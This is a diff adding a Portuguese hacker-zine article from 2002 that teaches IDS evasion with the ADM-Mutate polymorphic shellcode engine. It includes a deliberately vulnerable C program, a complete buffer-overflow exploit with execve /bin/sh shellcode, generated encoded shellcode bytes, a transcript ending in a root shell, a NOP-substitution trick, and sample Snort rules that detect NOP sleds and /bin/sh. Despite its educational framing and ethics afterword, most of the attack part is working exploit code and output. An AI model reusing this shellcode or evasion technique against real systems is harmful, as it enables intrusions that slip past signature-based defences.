@@ -1,0 +1,499 @@
+##############################################################################
+############################ UNSEKURITY SCENE ################################
+##############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Estes e outros documentos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://www.kimera.com.br/
+http://coracaodeleao.virtualave.net/
+http://int0x80.host.sk/
+
+Observacao: O autor nao se responsabiliza pelo mau uso dos dados e
+            exemplos aqui disponibilizados. Script kiddies(defacers),
+            crackers e analistas de seguranca sao orientados a nao lerem
+            este documento. Todos as informacoes fornecidas possuem apenas
+            carater educacional.
+
+
+                *********************************************
+                *   ADM-MUTATE E SHELLCODES POLIMORFICOS    *
+                *********************************************
+
+
+1 - Introducao
+2 - Shellcode Polimorficos
+3 - ADM-Mutate
+4 - Terminando
+    4.1 - Links e Referencias
+    4.2 - Consideracoes Finais
+    4.3 - Agradecimentos
+    
+
+---------------
+1 - Introducao |
+---------------
+
+Muitos sistemas de deteccao de intrusos(IDS's) estao sendo usados
+atualmente visando aumentar a seguranca dos sistemas e consequentemente 
+impedir que os mesmos possam ser explorados para fins ilicitos.
+
+O conceito mais utilizado em sistemas de IDS, principalmente nas NIDS
+(Network IDS) eh o mesmo utilizado em sistemas de Anti-Virus, ou seja,
+o conceito de assinatura.
+
+No decorrer deste artigo, pretendo demonstrar que este conceito nasceu
+falho e analisar a construcao de shellcodes individuais capazes de passar
+por alguns sistemas de IDS.
+
+Faz-se necessario conhecimentos basicos de escrita de exploits em C
+para Linux e de Shellcode. Todos os exemplos foram testado em plataforma
+Linux Slackware 7.0.
+
+Este documento nao pretender aprofundar na escrita de shellcodes 
+polimorficos, mas sim, eh um simples guia pratico de como transformar
+shellcodes normais em shellcodes polimorficos. Talvez num futuro proximo
+eu venha a abordar as tecnicas em pormenores.
+
+---------------------------
+2 - Shellcode Polimorficos |
+---------------------------
+
+Com o advento dos scanners de assinaturas(aka IDS, para alguns). Muitos
+explois publicos se tornaram ineficazes por conta do uso de shellcodes
+amplamente conhecidos e com regras(assinaturas) presentes nas ferramentas
+de IDS.
+
+Um exemplo claro eh a possibilidade de detectar o envio de dados suspeitos
+contendo instrucoes "Assembly" no snort com uma simples regra:
+
+alert tcp any any -> any any (content:"|9090 9090 9090 9090|";
+                                        msg:"NOPs recebidos!";)
+
+Se utilizarmos um exploit que envia NOP(0x90 em Intel) para o servidor
+alvo, o ataque serah detectado e dependendo da IDS, eh possivel que
+o mesmo seja bloqueado.
+
+Outra regra, eh a que eh contra a propria string /bin/sh, muito utilizada
+em exploits publicos:
+
+alert tcp any any -> any 21 (content:"/bin/sh";
+				 msg:"FTPd sendo atacado!";)
+
+Em um documento, escrito por mim (TRUQUES CONTRA IDSs - I parte), eu
+abordei alguns esquemas que podem ser funcionais para passar por este
+tipo de filtragem, por exemplo, substituir NOP por "jmp 0x01", e encriptar
+o shellcode, fazendo a string /bin/sh se tornar diferente.
+
+Desde entao, a tecnica de construcao propria de exploit tem sido
+efetiva contra as defesas dos sistemas de IDS que atuam com base em
+assinaturas. Mas podemos ir mais alem.
+
+K2 da ADM (http://adm.isp.at/) criou uma ferramenta capaz de automatizar
+a escrita de exploits com shellcodes polimorficos. Conhecida como 
+ADM-Mutate, esta ferramenta tem dado trabalho aos Analistas de Seguranca,
+pois a capacidade de gerar shellcode indivual(polimorfico) eh bastante
+interessante e eficaz.
+
+O conceito de shellcode polimorfico remonta aos esquemas de infeccao
+virotica presentes em virus evoluidos que sao capazes de burlar toda
+a defesa dos atuais sistemas de anti-virus. Um virus polimorfico tem a
+capacidade de alterar seu proprio codigo e inserir codigos diferentes
+de si mesmo(no entanto, permanece a mesma execucao, objetivo) em outros
+arquivos. Muitas vezes, quando vemos um virus ter N variacoes(Virus - A,
+B, C, D .. I, e etc),eh possivel que tal virus seja polimorfico e consiga 
+passar pelas assinaturas. Deste modo as assinaturas dos sistemas de 
+anti-virus precisam ser sempre atualizadas(update de anti-virus) para que 
+possa se precaver contra as novas ameacas. Do mesmo modo sao os shellcodes
+polimorficos, na pratica, sempre existirah a possibilidade de um
+shellcode polimorfico escapar do banco de dados de assinaturas do
+sistema de IDS, e como foi dito, o ADM-Mutate facilitou esta tarefa.
+
+
+--------------- 
+3 - ADM-Mutate |
+---------------
+
+Sem sombra de duvidas uma das grandes criacoes do pessoal da ADM.
+O ADM-mutate funciona como uma API capaz de capturar o buffer que
+serah usado para o envio da string de exploitacao(NOPs + Shellcode +
+RET, por exemplo) e em cima dele alterar o shellcode tornando-o
+diferente do shellcode anterior(muitas vezes o shellcode padrao - Aleph1).
+
+Antes de partirmos para o manuseio desta ferramenta, vamos primeiro
+criar nosso programa alvo:
+
+------------------------------- vul1.c ---------------------------------
+/* Exemplo de programa alvo vulneravel a BO,
+ * mas com uma simples checagem simulando IDS.
+ * Nash Leon - nashleon@yahoo.com.br
+ */
+
+#include <stdio.h>
+#include <strings.h>
+
+#define  MAXSIZE   512
+
+int bugada(char *pam, int bsize){
+char buffer[MAXSIZE];
+int i;
+
+/* Checagem com string /bin/sh */
+
+if(strstr(pam,"/bin/sh")){
+fprintf(stderr,"A Matrix pegou voce!\n");
+exit(1);
+}
+
+for(i = 0; i < strlen(pam); i++){
+  buffer[i] = pam[i];
+ }
+
+return 0;
+}
+
+
+int main(int argc, char *argv[]){
+if(argc < 2){
+printf("Uso: %s <string>\n",argv[0]);
+exit(0);
+    }
+bugada(argv[1], strlen(argv[1]));
+
+return 0;
+}
+-------------------------------------------------------------------
+
+Se fossemos exploitar com um exploit que executa shellcode execv(/bin/sh),
+seriamos detectado facilmente. Existem inumeros meios de passar por
+este esquema, afinal, /bin/sh eh desnecessario na maioria das exploitacoes.
+No entanto, vejamos como podemos manipular a API do ADM-mutate.
+
+--------------------------------- exp1.c ---------------------------------
+/* Exemplo de exploit utilizando ADM-mutate para
+ * gerar shellcode polimorfico.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include "ADMmutapi.h"
+
+#define SIZE   540
+#define NOPDEF 200
+#define DEFOFF 0
+
+char *shell =
+"\xeb\x22\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x31\xc0\xaa"
+"\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x08\x04"
+"\x03\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff"
+"\xff\xff/bin/sh";
+
+char buffer[SIZE];
+
+unsigned long get_esp() {
+__asm__("movl %esp,%eax");
+}
+
+int main (int argc, char *argv[]) {
+unsigned long esp, offset = 0;
+
+/* Variaveis da ADMmutapi */
+
+struct morphctl *mctlp;
+struct morphctl mut;
+int i;
+mut.upper = 0; mut.lower = 0; mctlp = &mut;
+mut.banned=0;
+mut.arch = IA32;
+
+if (argc > 1) offset += strtol(argv[1], NULL, 0);
+
+/* Criamos o buffer que seria usado */
+
+esp = get_esp() + offset;
+memset(buffer, 0x90, SIZE);
+memcpy(buffer+NOPDEF, shell, strlen(shell));
+for (i = NOPDEF+strlen(shell); i < SIZE-4; i += 4) {
+       *((int *) &buffer[i]) = esp;
+  }
+
+/* Agora transformamos no buffer o shellcode polimorfico */
+
+init_mutate(mctlp);
+apply_key(buffer, strlen(shell), NOPDEF-1, mctlp);
+apply_jnops(buffer, NOPDEF-1, mut);
+apply_engine(buffer, strlen(shell), NOPDEF-1, mut);
+
+/* Executamos o programa alvo */
+
+execl("./vul1", "vul1", buffer, NULL);
+return 0;
+}
+-------------------------------------------------------------------------
+
+Exploitando teriamos:
+
+kimera3:/work/txts/ADMmutate-0.8.4# !gc
+gcc -o exp1 exp1.c ADMmuteng.o
+
+# ./exp1 12
+<muito lixo>
+odr = 0, odr = 1, odr = 3, odr = 2, odr = 4, odr = 5, odr = 6, odr = 8,
+odr = 9, odr = 7, odr = 10, odr = 11, odr = 12, HARD CODE [0x4e]
+HARD CODE [0x0c]
+HARD CODE [0xffffffde]
+HARD CODE [0x0a]
+ENGINE[85] =
+"\xeb\x4e\x33\xc0\x83\xe8\x9d\x6b\xc0\x36\x48\x6b\xc0\xfd\x58\x96"
+"\x31\xc9\x83\xf0\x88\x37\x9f\x3f\x87\xc9\xbb\x6b\x50\x5f\xf8\xb1"
+"\x0c\x92\x47\x9b\x83\xe0\x43\x31\x1e\x40\x46\x8c\xc0\xf5\x98\x96"
+"\x40\x96\x92\x99\xf5\x9b\x96\x40\x96\x90\x37\x9c\x96\x40\x96\x87"
+"\xdb\x9e\x87\xd2\x85\xc0\x92\xe2\xde\x2f\xeb\x0a\x99\xc1\xc8\xaf"
+"\xe8\xb9\xff\xff\xff"
+sh-2.03# id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),
+6(disk),10(wheel),11(floppy)
+sh-2.03# ./vul1 /bin/sh
+A Matrix pegou voce!
+sh-2.03#
+
+Devemos notar que nosso shellcode inicial tem o /bin/sh, mas o esquema de
+polimorfismo do ADM-mutate transformou esta string em outra "aleatoria".
+
+Mas nao estamos aqui apenas para saber como executar a ferramenta, mas sim
+tambem qual os conceitos e o significado das funcoes.
+
+Indo mais alem, vamos novamente codar um exploit sem NOPs e utilizar a
+API do  ADM-mutate para gerarmos shellcode polimorfico, o programa alvo
+faz a seguinte checagem:
+
+/* Checagem de recebimento de NOPs(0x90 em i386) */
+
+if(strchr(pam,0x90)){
+fprintf(stderr,"A Matrix pegou voce!\n");
+exit(1);
+}
+
+Alvo agora eh vul2 com a checagem acima:
+
+# ./exp1 12
+<muito lixo>
+ odr = 9, odr = 10, odr = 11, odr = 12, HARD CODE [0x48]
+HARD CODE [0x0c]
+HARD CODE [0xffffffdd]
+HARD CODE [0x09]
+ENGINE[79] =
+"\xeb\x48\x58\x89\xc6\x37\x99\x31\xc0\x91\xfc\x8c\xc0\x83\xc8\x34"
+"\xbb\xd2\xbc\x70\x4c\x90\x98\x2f\x83\xe0\xb9\xb1\x0c\xc1\xc0\xb9"
+"\x8b\x06\x09\xd8\x21\x1e\xf7\x16\x21\x06\x9f\x99\x96\x40\x96\x98"
+"\x92\x96\x40\x96\x99\x4f\x96\x40\x96\xf8\x83\xf8\x25\x92\x83\xc6"
+"\x01\xe2\xdd\x85\xc0\xeb\x09\x83\xe8\x9c\xe8\xb3\xff\xff\xff"
+A Matrix pegou voce!
+#
+
+Entao, nao seremos bem sucedidos. No entanto, como explicado em
+outros documentos da Unsek Scene, podemos substituir NOP(0x90) por
+uma instrucao equivalente "jmp 0x01(\xeb\x01):
+
+/* jmp 0x01 no lugar de NOP */
+
+for(i = 0; i < SIZE; i+=2){
+buffer[i] = "0xeb";
+buffer[i+1] = "0x01";
+}
+
+# ./exp2 12
+<muito lixo>
+odr = 0, odr = 1, odr = 3, odr = 2, odr = 4, odr = 5, odr = 6, odr = 8,
+odr = 9, odr = 7, odr = 10, odr = 11, odr = 12, HARD CODE [0x3a]
+HARD CODE [0x0c]
+HARD CODE [0xffffffe5]
+HARD CODE [0x07]
+ENGINE[65] =
+"\xeb\x3a\x58\x96\x83\xf0\xa0\x83\xc0\x2d\x31\xc0\x91\x83\xc8\x3c"
+"\xbb\x95\x71\xf6\x32\x87\xd2\x83\xe8\x68\xb0\x67\xb1\x0c\x8b\x06"
+"\x09\xd8\x21\x1e\xf7\x16\x21\x06\x47\x83\xc6\x01\x46\x4f\x83\xc6"
+"\x01\x6b\xc0\xcf\x46\x87\xd2\xe2\xe5\xeb\x07\x48\xe8\xc1\xff\xff"
+"\xff"
+sh-2.03#
+
+Nao se preocupe se nao conseguir de primeira, como se trata de uma
+ferramenta automatizadora, ela pode gerar 0x90 dentro do proprio
+shellcode, fazendo assim que o mesmo seja detectado. Mas de qualquer
+modo, podemos ver que funciona e realmente pode ser usada contra
+ferramentas de IDSs e seu conceito de assinaturas. Existem outros
+meios de se executar instrucao "vazia" aka NOP(Veja link no fim do
+documento).
+
+O ADM-mutate automatiza a criacao de shellcode. Utiliza alguns conceitos
+dentre eles, encriptacao XOR, utilizacao de tolower e toupper, dentre
+outros conceitos. A vantagem maior dele eh seu poder de randomizacao,
+apesar de utilizar apenas rand() interagindo com srand(), isto eh
+muito efetivo em randomizar(aleatorizar) strings para a criacao dos
+shellcodes. Em se tratando se shellcodes, as possibilidades sao
+inumeras e de qualquer modo, as chaces de criacao de um shellcode
+personalizado individual sao reais e efetivas.
+
+As funcoes manuseadas na criacao dos shellcodes sao:
+
+int apply_key(char *mutant, size_t enc_amount, size_t enc_offset, struct
+morphctl *mut);
+
+Esta eh utilizada para geracao das chaves que servirao para codificar.
+
+int mutate_encode(char *workspc, size_t enc_amount, struct morphctl *mut,
+int step);
+
+Esta funcao gera e testa se eh realmente possivel e eficaz a codificacao.
+
+int apply_engine(char *mutant, size_t enc_amount, size_t eng_pad, struct
+morphctl mut);
+
+Esta funcao acima aplica o processo de "troca" de buffers(buffer original
+pelo com o shellcode polimorfico).
+
+int apply_jnops(char *mutant, size_t njlen, struct morphctl mut)
+
+A funcao acima irah inserir os NOPs ou instrucoes setadas como tais
+(jmp 0x01) no inicio do buffer.
+
+O processo eh bastante eficiente. Podemos passar nosso argumento
+banned, ativar ou desativar tolower , toupper, dentre outras coisas,
+veja a ADMmutapi.h.
+
+---------------
+4 - Terminando |
+---------------
+
+Este documento foi feito para especificar que ainda ha muita informacao
+sobre Shellcodes na NET(apesar dos esforcos de muitos,pouca em portugues).
+Enumero ainda Shellcodes Alpha-numericos(possuem somente caracteres
+alfa-numericos, podendo assim escapar de outras regras de IDS), Shellcode
+em UNICODE e outros sets de caracteres, Shellcodes em varias arquiteturas
+(mesmo codigo podendo ser executado em N tipos de plataformas), dentre
+outros.
+
+Deve existir muito mais coisas em oculto por aih, de modo que, cada
+fucador tem que estar ciente que as linhas que escreve nao se resumem a
+nem 1 / 1000 do conhecimento de um tema. E que a busca por informacao
+nao tem fim. Espero poder em breve dar sequencia aos meus documentos
+sobre shellcode fornecendo esquemas mais interessantes.
+
+4.1 - Links e Referencias
+--------------------------
+
+http://cansecwest.com/noplist-v1-1.txt -> Lista de NOPs e seus substitutos
+	em varias arquiteturas.
+
+http://ngsec.com/docs/polymorphic_shellcodes_vs_app_IDSs.PDF ->
+"Polymorphic Shellcodes vs. Application IDSs";
+
+http://ktwo.ca/ -> Home page do K2(criador do ADM-Mutate);
+http://adm.isp.at/ -> Home page da ADM.
+
+Maiores informacoes basicas sobre shellcode:
+http://unsekurity.virtualave.net/
+http://www.kimera.com.br/
+http://coracaodeleao.virtualave.net/
+
+Outros Links Interessantes:
+http://int0x80.host.sk/
+http://www.unsecurity.org/
+http://www.linuxsecurity.com.br/
+http://www.axur.org/
+
+
+http://www.phrack.org/ -> Infos sobre shellcodes alfa-numericos e
+			  multi-plataforma;
+http://www.linuxsecurity.com/
+http://www.counterpane.com/
+http://www.core-sdi.com/
+http://community.core-sdi.com/~julianor/
+
+    
+4.2 - Consideracoes Finais
+--------------------------
+
+As coisas nao sao tao simples quanto desejamos que sejam, no entanto,
+isto nao eh motivo para desanimo. Ao meu ver, em se tratando de
+hacking, conhecimento e perspicacia, quanto mais facil o desafio menos
+interessante e satisfatorio ele eh!
+
+Ao longo dos anos, eu tenho mostrado que eh muito mais facil quebrar
+a seguranca de um sistema do que aumentar a seguranca do mesmo. Saber
+escrever um shellcode eh facil, dificil eh conseguir proteger o sistema
+contra as possiveis variacoes dele. Neste documento vimos apenas uma
+das muitas tecnicas que existem e que tem tornado o hacking um desafio
+mais interessante para o lado de quem defende do que de quem ataca.
+
+Soh se pode defender um sistema se conhecer a essencia do problema e
+como ele pode ser explorado. Nao me refiro a exploracao feita por
+script kiddies(defacers) que nao sabem nem o que eh um shellcode e muito
+menos a exploracao feita por programadores(coders) que soh sabem 
+"escrever" um shellcode. Ha muito mais coisas envolvidas em ataques e 
+exploitacao do que esses dois extremos "sonhariam em imaginar". 
+
+Infelizmente, hoje em dia, as coisas que tornam uma pessoa capaz de
+vencer e superar problemas sao tao sutis aos olhos da maioria que eh
+preferivel buscar "gloria" sendo um script kiddie(defacer) ou demonstrando
+conhecimentos de programacao em baixo nivel(coder), do que amargar
+horas descobrindo novos meios de praticar a atividade fucadora sem
+chegar aos extremos.
+
+Limitar o hacking ao conhecimento tecnico pode significar regressao!
+Apesar de o nivel tecnico estar subindo, algo mais se faz necessario.
+
+Hoje(23/05/2002), eu vih um advisore de seguranca em que um grupo
+demonstrava partes de um codigo vulneravel a format bugs, e utilizaram
+este advisore para criticar alguns membros da banda podre da comunidade
+de seguranca(acho que deve haver criticas, mas nao ofensas pessoais).
+Se ao invez de olharmos para o lado, para procurarmos defeitos em nossos
+semelhantes(seja opositor ou nao) olhassemos para frente, para o codigo
+e seus possiveis furos, iriamos demonstrar com acoes que a seguranca eh
+apenas uma atitude mental, um estado de espirito, e em alguns casos,
+uma ilusao. No codigo fornecido, como exemplo de format bugs, havia
+2 outras condicoes de exploitacao via buffer overflows(memoria adjacente
+via strncpy(), e for()). Este grupo nao viu isso, porque estava a procura
+nao de desafios e nem de falhas, mas de fama! Ao ver o primeiro bug no
+software tratou logo de publicar um advisore visando manifestar seus
+conhecimentos tecnicos, soh que como eu, muitos outros, e outros da
+propria comunidade de seguranca e da banda podre viram e sabem que a
+"visao" deles nao eh tao grande quanto a fama procura afirmar.
+
+Busquemos sempre expandir em conhecimento, mas evitemos ser dominados
+pelo lado negro da forca. Ser etico eh ser responsavel! O que ganhamos
+buscando fama que amanha facilmente nao estarah acabado? - Certifiquemos
+do que realmente eh importante.
+ 
+
+4.3 - Agradecimentos
+--------------------
+
+"se fosse facil, todo mundo era..."
+"se fosse raso, ninguem se afogava.."
+			(Filhos do Cancer - Ze Ramalho)
+
+Ninguem pode chegar a lugar algum sozinho. E eu nao sou excecao,
+gostaria de agradecer a Deus por me ensinar os rumos que devo tomar.
+Nao vou citar nomes para evitar arrependimentos ou mesmo eventualmente
+alguem me pedir para retirar, mas quero agradecer aos fucadores que
+levam a serio a etica hacker e que procuram melhorar a cada dia,
+procurando ajudar ao proximo e visando sempre um altruismo verdadeiro.
+Ao pessoal da Kimera, Int0x80, os do canal #int80h da brasnet,
+pessoal de fora(de portugal, da holanda, argentina, estados unidos,
+alemanha, austria, mexico), mails list da Unsekurity, espero que possa
+continuar havendo troca de informacoes e que todos possam ser
+beneficiados.
+
+Um Abraco,
+
+Nash Leon.
+
+
+
+
+
+
